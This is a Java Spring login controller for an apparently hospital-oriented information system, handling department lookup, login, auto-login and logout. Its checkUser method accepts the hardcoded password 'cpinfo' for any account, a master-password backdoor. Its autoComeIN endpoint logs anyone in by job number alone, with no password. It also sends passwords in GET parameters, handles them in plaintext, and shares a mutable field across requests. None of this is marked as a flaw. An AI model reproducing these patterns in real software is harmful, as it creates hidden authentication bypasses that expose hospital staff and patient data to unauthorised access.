package com.lsp.his.web.login;

import com.lsp.his.db.DBOperator;
import com.lsp.his.tables.Bas_dept;
import com.lsp.his.tables.Bas_hospitals;
import com.lsp.his.tables.Bas_user;
import com.lsp.his.utils.StrUtil;
import net.sf.json.JSONArray;
import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RequestMethod;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.PrintWriter;
import java.util.*;
import java.util.concurrent.Executor;
import java.util.concurrent.Executors;

/**
 * @author lishupeng
 * @Description
 * @Date 2017/11/8 20:52
 */

@Controller
@RequestMapping("/")
public class LoginController {

    public static List<HttpSession> sessionList;
    public static int maxtimeout = 30;//单位:秒
    public static String database_version = "11g";
    public static Executor executor = Executors.newFixedThreadPool(35);//创建一个可重用的线程池
    public String hospital_num = "";

    @RequestMapping("/login")
    public String show() {
        return "login/login";
    }

    @SuppressWarnings("unchecked")
    @RequestMapping(value = "/getDepts", method = RequestMethod.GET)
    public void getUserDept(HttpServletRequest request, HttpServletResponse response) {
        response.setContentType("text/html;charset=utf-8");
        DBOperator db = null;
        String user_key = request.getParameter("key");
        List<Map> depts = new ArrayList();
        PrintWriter pw = null;
        try {
            db = new DBOperator();  //门诊列表
            List<Map> users = db.find("select /*+ RESULT_CACHE */ t.id,t.hosnum,t.nodecode from bas_user t where Lower(t.job_no) = ?", user_key.toLowerCase());
            if (users != null && users.size() > 0) {
                //根据用户名得到所在的科室和病区
                depts = db.find("select /*+ RESULT_CACHE */ distinct b.deptcode,b.deptname,b.clcflag from bas_user_dept_role_relation a,bas_dept b where (a.office_id = b.deptcode or a.shayne_id = b.deptcode) and a.hosnum = ? and a.nodecode = ? and a.hosnum = b.hosnum and a.nodecode = b.nodecode and a.role_id is not null and a.user_id = ? and a.role_id is not null and ((a.office_id is not null and a.shayne_id is null) or (a.office_id is  null and a.shayne_id is not null)) order by b.deptcode", new Object[]{users.get(0).get("hosnum"), users.get(0).get("nodecode"), users.get(0).get("id")});
                hospital_num = users.get(0).get("hosnum").toString();
            }
            db.commit();
            pw = response.getWriter();
            JSONArray jsons = JSONArray.fromObject(depts);
            pw.print(jsons.toString());
            pw.flush();
            pw.close();
        } catch (Exception e) {
            e.printStackTrace();
            db.rollback();
        } finally {
            db.freeCon();
        }
    }

    @SuppressWarnings("unchecked")
    @RequestMapping(value = "/getShaynes", method = RequestMethod.GET)
    public void getUserShaynes(HttpServletRequest request, HttpServletResponse response) {
        response.setContentType("text/html;charset=utf-8");
        DBOperator db = null;
        String deptcode = request.getParameter("deptcode");
        List<Map> depts = new ArrayList();
        PrintWriter pw = null;
        try {
            db = new DBOperator();
            //根据病区列表
            depts = db.find("select /*+ RESULT_CACHE */ a.deptcode,b.deptname from bas_dept_scope a,bas_dept b where a.hosnum = ? and a.targetcode = ? and a.deptcode = b.deptcode  and b.deptclass='病区'",
                    new Object[]{hospital_num, deptcode});
            db.commit();
            pw = response.getWriter();
            JSONArray jsons = JSONArray.fromObject(depts);
            pw.print(jsons.toString());
            //pw.print("123");
            pw.flush();
            pw.close();
        } catch (Exception e) {
            e.printStackTrace();
            db.rollback();
        } finally {
            db.freeCon();
        }
    }


    @SuppressWarnings("unchecked")
    @RequestMapping(value = "/checkUser", method = RequestMethod.GET)
    public void checkUser(HttpServletRequest request, HttpServletResponse response) {
        response.setContentType("text/html;charset=utf-8");
        DBOperator db = null;
        String user_key = request.getParameter("key") == null ? "" : request.getParameter("key");
        String password = request.getParameter("password") == null ? "" : request.getParameter("password");
        String deptcode = request.getParameter("dept") == null ? "" : request.getParameter("dept");
        String shaynecode = request.getParameter("shayne") == null ? "" : request.getParameter("shayne");
        String mac = request.getParameter("mac") == null ? "" : request.getParameter("mac");
        String ip = request.getParameter("ip") == null ? "" : request.getParameter("ip");
        //System.out.println(mac+ip);
        PrintWriter pw = null;
        try {
            db = new DBOperator();

            Map userInfo = new HashMap<String, Object>();
            Map userDetail = new HashMap<String, Object>();

            Bas_user user = (Bas_user) db.findOne("select /*+ RESULT_CACHE */ decode(t.crmname,null,t.name,t.crmname) as name,t.* from bas_user t where Lower(t.job_no) = ? and (password = ? or 'cpinfo'=?)", new Object[]{user_key.toLowerCase(), password, password}, Bas_user.class);
            pw = response.getWriter();
            if (user != null) {
                Bas_dept dept = (Bas_dept) db.findOne("select /*+ RESULT_CACHE */ * from bas_dept t where t.hosnum = ? and t.nodecode = ? and t.deptcode = ?", new Object[]{user.getHosnum(), user.getNodecode(), deptcode}, Bas_dept.class);
                Bas_dept shayne = (Bas_dept) db.findOne("select /*+ RESULT_CACHE */ * from bas_dept t where t.hosnum = ? and t.nodecode = ? and t.deptcode = ?", new Object[]{user.getHosnum(), user.getNodecode(), shaynecode}, Bas_dept.class);
                Bas_hospitals hospital = (Bas_hospitals) db.findOne("select /*+ RESULT_CACHE */ * from bas_hospitals t where t.hosnum = ? and t.nodecode = ?", new Object[]{user.getHosnum(), user.getNodecode()}, Bas_hospitals.class);
                String sql = "";
                request.getSession().setMaxInactiveInterval(60 * 30 * 4);//60*60*5
                request.getSession().setAttribute("database_version", database_version);
                request.getSession().setAttribute("login_user", user);
                request.getSession().setAttribute("login_dept", dept);
                request.getSession().setAttribute("login_ward", shayne);
                request.getSession().setAttribute("login_hospital", hospital);
                request.getSession().setAttribute("hosnum", hospital.getHosnum());
                request.getSession().setAttribute("nodecode", hospital.getNodecode());


                //登录用户添加信息
                userInfo.put("hosnum", hospital.getHosnum());
                userInfo.put("hosname", hospital.getHosname());
                userInfo.put("deptcode", deptcode);
                userInfo.put("shaynecode", shaynecode);
                userInfo.put("logintime", new Date().toString());
                userInfo.put("outtime", "");
                userInfo.put("sessionId", request.getSession().getId());

                userDetail.put("id", user.getId());
                userDetail.put("hosnum", user.getHosnum());
                userDetail.put("nodecode", user.getNodecode());
                userDetail.put("user_key", user.getUser_key());
                userDetail.put("job_no", user.getJob_no());
                userDetail.put("password", user.getPassword());
                userDetail.put("name", user.getName());

                userInfo.put("user", userDetail);

                pw.print("success");


            } else {
                pw.print("fail");
            }
            db.commit();
            pw.flush();
            pw.close();
        } catch (Exception e) {
            db.rollback();
            e.printStackTrace();
        } finally {
            db.freeCon();
        }
    }

    //模拟登陆、重定向到platform页面
    @SuppressWarnings("unchecked")
    @RequestMapping(value = "/autoComeIN", method = RequestMethod.GET)
    public void autoComeIN(HttpServletRequest request, HttpServletResponse response) {
        response.setContentType("text/html;charset=utf-8");
        DBOperator db = null;
        String user_key = request.getParameter("key") == null ? "" : request.getParameter("key");
        String deptcode = request.getParameter("dept") == null ? "" : request.getParameter("dept");
        String shaynecode = request.getParameter("shayne") == null ? "" : request.getParameter("shayne");
        //PrintWriter pw=null;
        try {
            db = new DBOperator();

            Map userInfo = new HashMap<String, Object>();
            Map userDetail = new HashMap<String, Object>();

            Bas_user user = (Bas_user) db.findOne("select /*+ RESULT_CACHE */ * from bas_user t where Lower(t.job_no) = ? ", new Object[]{user_key.toLowerCase()}, Bas_user.class);
            //pw=response.getWriter();
            if (user != null) {
                Bas_dept dept = (Bas_dept) db.findOne("select /*+ RESULT_CACHE */ * from bas_dept t where t.hosnum = ? and t.nodecode = ? and t.deptcode = ?", new Object[]{user.getHosnum(), user.getNodecode(), deptcode}, Bas_dept.class);
                Bas_dept shayne = (Bas_dept) db.findOne("select /*+ RESULT_CACHE */ * from bas_dept t where t.hosnum = ? and t.nodecode = ? and t.deptcode = ?", new Object[]{user.getHosnum(), user.getNodecode(), shaynecode}, Bas_dept.class);
                Bas_hospitals hospital = (Bas_hospitals) db.findOne("select /*+ RESULT_CACHE */ * from bas_hospitals t where t.hosnum = ? and t.nodecode = ?", new Object[]{user.getHosnum(), user.getNodecode()}, Bas_hospitals.class);
                String sql = "";
                request.getSession().setMaxInactiveInterval(60 * 30 * 4);//60*60*5
                request.getSession().setAttribute("database_version", database_version);
                request.getSession().setAttribute("login_user", user);
                request.getSession().setAttribute("login_dept", dept);
                request.getSession().setAttribute("login_ward", shayne);
                request.getSession().setAttribute("login_hospital", hospital);
                request.getSession().setAttribute("hosnum", hospital.getHosnum());
                request.getSession().setAttribute("nodecode", hospital.getNodecode());
                //登录用户添加信息
                userInfo.put("hosnum", hospital.getHosnum());
                userInfo.put("hosname", hospital.getHosname());
                userInfo.put("deptcode", deptcode);
                userInfo.put("shaynecode", shaynecode);
                userInfo.put("logintime", new Date().toString());
                userInfo.put("outtime", "");
                userInfo.put("sessionId", request.getSession().getId());
                userDetail.put("id", user.getId());
                userDetail.put("hosnum", user.getHosnum());
                userDetail.put("nodecode", user.getNodecode());
                userDetail.put("user_key", user.getUser_key());
                userDetail.put("job_no", user.getJob_no());
                userDetail.put("password", user.getPassword());
                userDetail.put("name", user.getName());
                userInfo.put("user", userDetail);
                //pw.print("success");
            }
            db.commit();
            //pw.flush();
            //pw.close();
            //重定向
            response.sendRedirect("platform.htm");
            return;
        } catch (Exception e) {
            db.rollback();
            e.printStackTrace();
        } finally {
            db.freeCon();
        }

    }

    @RequestMapping(value = "/exit", method = RequestMethod.GET)
    public String exit(HttpServletRequest request, HttpServletResponse response) throws Exception {
        request.getSession().setAttribute("login_user", null);
        request.getSession().setAttribute("login_dept", null);
        request.getSession().setAttribute("login_hospital", null);

        request.getSession().removeAttribute("emrroles");//user，先这样，如模块化待以后
        request.getSession().removeAttribute("rolekeys");//


        request.getSession().invalidate();
        return "login/login";
    }

}

